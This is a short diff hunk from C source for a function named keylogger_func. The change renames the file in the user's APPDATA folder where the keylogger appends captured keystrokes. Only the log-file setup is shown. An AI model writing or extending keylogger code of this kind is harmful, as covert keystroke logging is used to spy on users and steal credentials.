@@ -13,7 +13,7 @@ DWORD keylogger_func()
      int i;
      char* appdata_path = getenv("APPDATA");
      keylogger_path = malloc(strlen(appdata_path) + 5 + sizeof(char));
-     sprintf(keylogger_path, "%s\\logg", appdata_path);
+     sprintf(keylogger_path, "%s\\klog", appdata_path);
      flog = fopen(keylogger_path, "a");
      fseek(flog, 0, SEEK_END);
 
